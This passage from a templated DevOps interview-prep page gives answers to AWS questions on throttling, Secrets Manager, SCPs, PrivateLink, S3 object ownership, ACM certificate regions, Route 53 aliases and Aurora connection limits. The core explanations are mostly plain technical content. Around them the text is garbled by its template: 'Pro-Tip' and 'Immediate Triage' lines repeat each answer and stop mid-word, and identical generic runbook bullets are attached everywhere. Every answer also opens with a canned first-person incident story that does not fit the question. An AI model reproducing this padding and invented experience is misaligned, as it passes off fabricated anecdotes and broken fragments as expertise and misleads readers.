AWS Config continuous compliance — detects when actual resource state drifts from desired. CloudFormation Drift Detection — compares stack with deployed resources. Terraform plan in CI — `terraform plan` in a scheduled job shows drift. Set up alerts to notify when drift is detected.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: AWS Config continuous compliance — detects when actual resource state drifts from desired. CloudFormation Drift Detection — compar.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: AWS Config continuous compliance — detects when actual resource state drifts from desired. Clou
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-106-aws-q90-youre-getting-throttled-on-aws-api-calls-how-do-you-fix-it-l2"></a>
### 106. AWS Q90: Youre getting throttled on AWS API calls How do you fix it [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You're getting throttled on AWS API calls. How do you fix it?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Implement exponential backoff with jitter in API retry logic. Use AWS SDK built-in retry (most SDKs have this). Reduce polling frequency. Request limit increase via Service Quotas for critical APIs. Batch operations where possible (batch writes to DynamoDB, batch calls to CloudWatch).

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Implement exponential backoff with jitter in API retry logic. Use AWS SDK built-in retry (most SDKs have this). Reduce polling fre.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Implement exponential backoff with jitter in API retry logic. Use AWS SDK built-in retry (most
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-107-aws-q91-what-is-amazon-inspector-and-when-would-you-use-it-l2"></a>
### 107. AWS Q91: What is Amazon Inspector and when would you use it [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is Amazon Inspector and when would you use it?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Automated security vulnerability assessment for EC2 and ECR. Scans OS packages and app libraries for CVEs. Integrates with Security Hub. Use for: continuous vulnerability scanning of running instances, container image scanning before deployment, compliance reporting.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Automated security vulnerability assessment for EC2 and ECR. Scans OS packages and app libraries for CVEs. Integrates with Securit.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Automated security vulnerability assessment for EC2 and ECR. Scans OS packages and app librarie
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-108-aws-q92-how-does-aws-handle-availability-zones-and-how-should-you-design-for-az-failure-l3"></a>
### 108. AWS Q92: How does AWS handle availability zones and how should you design for AZ failure [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"How does AWS handle availability zones and how should you design for AZ failure?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Each AZ is a physically separate data center (separate power, cooling, networking). AZs in same region connected via low-latency links. Design: deploy in min 2 AZs (preferably 3). Use Multi-AZ RDS. Use ALB (automatically multi-AZ). Use ECS/ASG with instances spread across AZs. Don't use AZ-specific resources for critical state.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Each AZ is a physically separate data center (separate power, cooling, networking). AZs in same region connected via low-latency l.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Each AZ is a physically separate data center (separate power, cooling, networking). AZs in same
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-109-aws-q93-what-is-aws-trusted-advisor-and-what-does-it-check-l2"></a>
### 109. AWS Q93: What is AWS Trusted Advisor and what does it check [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is AWS Trusted Advisor and what does it check?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Recommends best practices across: Cost Optimization (idle resources, unused RIs), Security (open SGs, IAM best practices), Fault Tolerance (Multi-AZ, backups), Performance (underutilized instances), Service Limits. Free tier has limited checks. Business/Enterprise support gets all checks.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Recommends best practices across: Cost Optimization (idle resources, unused RIs), Security (open SGs, IAM best practices), Fault T.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Recommends best practices across: Cost Optimization (idle resources, unused RIs), Security (ope
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-110-aws-q94-how-do-you-rotate-an-rds-database-password-without-downtime-l2"></a>
### 110. AWS Q94: How do you rotate an RDS database password without downtime [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"How do you rotate an RDS database password without downtime?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Use AWS Secrets Manager. It stores the password and has a rotation Lambda function that: generates new password, updates it in RDS, updates the secret value. Your app retrieves the password from Secrets Manager (not hardcoded). During rotation, there's a brief period where both old and new passwords work (RDS supports this). Zero downtime.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Use AWS Secrets Manager. It stores the password and has a rotation Lambda function that: generates new password, updates it in RDS.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Use AWS Secrets Manager. It stores the password and has a rotation Lambda function that: genera
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-111-aws-q95-what-is-service-control-policy-scp-in-aws-organizations-and-how-is-it-different-from-an-iam-policy-l3"></a>
### 111. AWS Q95: What is Service Control Policy (SCP) in AWS Organizations and how is it different from an IAM policy [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is Service Control Policy (SCP) in AWS Organizations and how is it different from an IAM policy?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

SCP is a guardrail for entire AWS accounts in an Organization. It restricts what IAM policies in those accounts can allow. If SCP doesn't allow an action, no IAM policy in that account can grant it. SCPs don't grant permissions — they limit the maximum permissions. Use: prevent any account from leaving the org, prevent specific regions from being used, enforce tagging requirements.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: SCP is a guardrail for entire AWS accounts in an Organization. It restricts what IAM policies in those accounts can allow. If SCP .

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: SCP is a guardrail for entire AWS accounts in an Organization. It restricts what IAM policies i
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-112-aws-q96-how-do-you-set-up-cross-account-logging-where-all-aws-accounts-in-your-org-send-logs-to-a-central-security-account-l2"></a>
### 112. AWS Q96: How do you set up cross-account logging where all AWS accounts in your org send logs to a central security account [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"How do you set up cross-account logging where all AWS accounts in your org send logs to a central security account?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

In each account: create CloudTrail and send to S3 in the security account. Update the security account S3 bucket policy to allow PutObject from all org accounts. Or use CloudTrail Organization Trail — one trail covers all accounts in the org automatically.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: In each account: create CloudTrail and send to S3 in the security account. Update the security account S3 bucket policy to allow P.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: In each account: create CloudTrail and send to S3 in the security account. Update the security
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-113-aws-q97-your-application-is-making-too-many-calls-to-aws-secrets-manager-and-youre-being-charged-heavily-how-do-you-reduce-this-l2"></a>
### 113. AWS Q97: Your application is making too many calls to AWS Secrets Manager and youre being charged heavily How do you reduce this [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your application is making too many calls to AWS Secrets Manager and you're being charged heavily. How do you reduce this?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Cache the secret in application memory (most secrets don't change frequently). AWS Secrets Manager SDK supports caching. Or use Parameter Store (cheaper) for non-rotating secrets. Set an appropriate cache TTL that balances freshness with cost.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Cache the secret in application memory (most secrets don't change frequently). AWS Secrets Manager SDK supports caching. Or use Pa.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Cache the secret in application memory (most secrets don't change frequently). AWS Secrets Mana
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-114-aws-q98-what-is-aws-privatelink-and-how-does-it-differ-from-vpc-peering-l3"></a>
### 114. AWS Q98: What is AWS PrivateLink and how does it differ from VPC Peering [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"What is AWS PrivateLink and how does it differ from VPC Peering?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

PrivateLink: exposes a specific service (not a whole network) from one VPC to another. Traffic goes through AWS backbone. Supports cross-account and even cross-org. No routing conflicts, no overlapping CIDR issues. VPC Peering: connects two entire VPCs. All resources in both VPCs can communicate. More permissive, simpler for full VPC connectivity.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: PrivateLink: exposes a specific service (not a whole network) from one VPC to another. Traffic goes through AWS backbone. Supports.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: PrivateLink: exposes a specific service (not a whole network) from one VPC to another. Traffic
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-115-aws-q99-your-cloudformation-deployment-is-taking-too-long-how-do-you-speed-it-up-l2"></a>
### 115. AWS Q99: Your CloudFormation deployment is taking too long How do you speed it up [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"Your CloudFormation deployment is taking too long. How do you speed it up?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Parallelize independent resources (CFN does this automatically). Use nested stacks to update only changed stacks. Use ChangeSets to preview changes before applying. For complex stacks: CDK or SAM can generate more efficient templates. For ECS deployments: minimize health check wait times.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Parallelize independent resources (CFN does this automatically). Use nested stacks to update only changed stacks. Use ChangeSets t.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Parallelize independent resources (CFN does this automatically). Use nested stacks to update on
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-116-aws-q100-how-would-you-design-a-system-to-handle-100000-concurrent-websocket-connections-on-aws-l3"></a>
### 116. AWS Q100: How would you design a system to handle 100000 concurrent WebSocket connections on AWS [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"How would you design a system to handle 100,000 concurrent WebSocket connections on AWS?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. When addressing this question, I walk the interviewer through our production incident runbook: isolating the blast radius, checking diagnostic logs and metrics, and applying a safe fix."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Use API Gateway WebSocket API (scales automatically, no infra to manage). Each connection triggers Lambda functions for connect/disconnect/message. Store connection IDs in DynamoDB. To broadcast: scan DynamoDB for connection IDs, call `@connections` endpoint for each. Use DynamoDB Streams + Lambda for fan-out. For >100k: consider using an ALB with ECS (NLB supports WebSockets with sticky sessions at high scale). ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Use API Gateway WebSocket API (scales automatically, no infra to manage). Each connection triggers Lambda functions for connect/di.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Use API Gateway WebSocket API (scales automatically, no infra to manage). Each connection trigg
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-117-aws-q101-a-developer-needs-to-temporarily-get-a-shell-inside-a-running-fargate-container-in-a-private-subnet-with-absolutely-no-inbound-ssh-access-how-do-you-facilitate-this-securely-l2"></a>
### 117. AWS Q101: A developer needs to temporarily get a shell inside a running Fargate container in a private subnet with absolutely no inbound SSH access How do you facilitate this securely [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"A developer needs to temporarily get a shell inside a running Fargate container in a private subnet with absolutely no inbound SSH access. How do you facilitate this securely?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. The interviewer is testing: ECS Exec, AWS Systems Manager (SSM) Session Manager.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

You would use **ECS Exec** (which is powered by AWS Systems Manager Session Manager under the hood).

- Ensure the ECS Task Role has the required SSM permissions (`ssmmessages:CreateControlChannel`, etc.).
- Update the ECS Service or Task definition to explicitly enable `EnableExecuteCommand: true`.
- The developer uses the AWS CLI to run: `aws ecs execute-command --cluster  --task  --container  --interactive --command "/bin/sh"`.

##### 2️⃣ Remediation & Permanent Safeguards

This opens a secure, audited websocket tunnel directly into the container. There are no SSH keys to manage, no inbound ports need to be opened on the Security Group, and every shell command typed is fully logged to CloudWatch/CloudTrail. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Ensure the ECS Task Role has the required SSM permissions (ssmmessages:CreateControlChannel, etc.)..

#### ⏱️ 60-Second Elevator Pitch Summary

- Ensure the ECS Task Role has the required SSM permissions (ssmmessages:CreateControlChannel, etc.).
- Update the ECS Service or Task definition to explicitly enable EnableExecuteCommand: true.
- The developer uses the AWS CLI to run: aws ecs execute-command --cluster  --task  --container  --...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-118-aws-q102-a-team-in-aws-account-a-is-writing-data-to-an-s3-bucket-in-account-b-account-b-explicitly-grants-them-s3putobject-in-the-bucket-policy-however-when-account-b-administrators-try-to-read-the-files-they-get-access-denied-why-and-how-is-it-fixed-l3"></a>
### 118. AWS Q102: A team in AWS Account A is writing data to an S3 bucket in Account B Account B explicitly grants them s3PutObject in the bucket policy However when Account B administrators try to read the files they get Access Denied Why and how is it fixed [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `AWS` `Cost & Architecture` `L3` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"A team in AWS Account A is writing data to an S3 bucket in Account B. Account B explicitly grants them `s3:PutObject` in the bucket policy. However, when Account B administrators try to read the files, they get `Access Denied`. Why, and how is it fixed?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I troubleshoot this in AWS, I frame it through my hands-on production experience. The interviewer is testing: Cross-account S3 Object Ownership.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Historically, in S3, the AWS account that uploads the object retains explicit ownership and full control of that object, even if the bucket itself belongs to a different account. Because Account A uploaded the file, Account A owns it, and Account B (the bucket owner) is locked out unless Account A explicitly grants them read ACLs during the upload (`--acl bucket-owner-full-control`). *The Modern Fix:* In Account B, go to the S3 bucket settings and enable **S3 Object Ownership: Bucket owner enforced**. This entirely disables all legacy ACLs. The bucket owner (Account B) automatically and forcefully assumes ownership of every file uploaded to the bucket, instantly restoring their read access. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Historically, in S3, the AWS account that uploads the object retains explicit ownership and full control of that object, even if t.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Historically, in S3, the AWS account that uploads the object retains explicit ownership and ful
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-119-aws-q103-you-are-deploying-an-api-gateway-mapped-to-a-custom-domain-name-natively-in-the-eu-west-1-ireland-region-you-request-a-free-acm-aws-certificate-manager-ssl-certificate-in-eu-west-1-but-api-gateway-absolutely-refuses-to-let-you-select-it-from-the-dropdown-why-l2"></a>
### 119. AWS Q103: You are deploying an API Gateway mapped to a custom domain name natively in the eu-west-1 (Ireland) region You request a free ACM (AWS Certificate Manager) SSL certificate in eu-west-1 but API Gateway absolutely refuses to let you select it from the dropdown Why [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You are deploying an API Gateway mapped to a custom domain name natively in the `eu-west-1` (Ireland) region. You request a free ACM (AWS Certificate Manager) SSL certificate in `eu-west-1`, but API Gateway absolutely refuses to let you select it from the dropdown. Why?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In a previous role, our monitoring paged me for a similar incident across our AWS VPC infrastructure. The interviewer is testing: Edge-optimized APIs vs Regional APIs, ACM region constraints.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

This happens because you selected an **Edge-Optimized** API Gateway endpoint. Edge-optimized endpoints are actually deployed globally onto the CloudFront Content Delivery Network (CDN) edge locations. CloudFront strictly mandates that all ACM SSL certificates must reside exclusively in the **`us-east-1` (N. Virginia)** region, regardless of where the underlying API Gateway actually lives. *Fix:* Either request a new ACM certificate in `us-east-1` and attach it, or change the API Gateway endpoint type from "Edge-Optimized" to "Regional", which will natively accept the existing `eu-west-1` certificate. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: This happens because you selected an Edge-Optimized API Gateway endpoint..

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: This happens because you selected an Edge-Optimized API Gateway endpoint.
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-120-aws-q104-in-amazon-route-53-what-is-the-critical-architectural-difference-between-a-standard-dns-cname-record-and-an-aws-alias-record-l1"></a>
### 120. AWS Q104: In Amazon Route 53 what is the critical architectural difference between a standard DNS CNAME record and an AWS Alias record [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Core Fundamentals [L1]`

**Tags:** `AWS` `Cost & Architecture` `L1` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"In Amazon Route 53, what is the critical architectural difference between a standard DNS `CNAME` record and an AWS `Alias` record?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"AWS reliability requires differentiating between AWS control plane limits and host-level resource exhaustion. The interviewer is testing: Route 53 proprietary features, Zone Apex limitations.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

A **CNAME (Canonical Name)** essentially maps one domain to another domain. However, the strict global DNS protocol absolutely forbids a CNAME from being placed at the "Zone Apex" (the naked root domain, e.g., `company.com`).

- **Zone Apex:** You *can* place an Alias record at the root domain (`company.com`) to seamlessly point to an ALB or CloudFront distribution.
- **Cost & Speed:** Alias records to AWS resources are completely free of charge in Route 53 and resolve faster natively within the AWS network.

##### 2️⃣ Remediation & Permanent Safeguards

An **Alias Record** is an AWS-specific proprietary extension that acts like a CNAME but resolves under the hood directly to an IP address. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Zone Apex: You *can* place an Alias record at the root domain (company.com) to seamlessly point to an ALB or CloudFront distributi.

#### ⏱️ 60-Second Elevator Pitch Summary

- Zone Apex: You *can* place an Alias record at the root domain (company.com) to seamlessly point t...
- Cost & Speed: Alias records to AWS resources are completely free of charge in Route 53 and resolv...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-121-aws-q105-you-migrate-an-application-from-a-traditional-rds-instance-to-aurora-serverless-v2-during-a-sudden-10x-traffic-spike-the-database-scales-up-successfully-but-the-application-crashes-heavily-citing-too-many-connections-why-didnt-aurora-solve-the-connection-limits-l2"></a>
### 121. AWS Q105: You migrate an application from a traditional RDS instance to Aurora Serverless v2 During a sudden 10x traffic spike the database scales up successfully but the application crashes heavily citing Too many connections Why didnt Aurora solve the connection limits [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `AWS` • `Cost & Architecture` | **Type:** `Production Scenario [L2]`

**Tags:** `AWS` `Cost & Architecture` `L2` `Cloud` `Infrastructure`

> **Interview Question:**  
> *"You migrate an application from a traditional RDS instance to Aurora Serverless v2. During a sudden 10x traffic spike, the database scales up successfully, but the application crashes heavily citing "Too many connections." Why didn't Aurora solve the connection limits?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our AWS cloud environment, we managed high-traffic microservices where this exact scenario occurred. The interviewer is testing: Compute scaling vs TCP connection limits.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

Aurora Serverless v2 dynamically scales compute (CPU and RAM) via ACUs (Aurora Capacity Units) in milliseconds. However, it scales the *underlying instance size*. It does not act as a TCP connection multiplexer. When traffic spikes 10x, the application spawns 10x more active TCP connections to the database. Even though the database has the CPU to handle the queries, the raw connection pool limit was breached before the engine could scale up enough to accommodate the new `max_connections` parameter limit. *Fix:* Serverless databases must always be paired with a connection pooler like **Amazon RDS Proxy** to efficiently queue and multiplex the massive influx of microservice TCP connections into a small, steady pool of long-lived database connections. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Aurora Serverless v2 dynamically scales compute (CPU and RAM) via ACUs (Aurora Capacity Units) in milliseconds. However, it scales.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Aurora Serverless v2 dynamically scales compute (CPU and RAM) via ACUs (Aurora Capacity Units)
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

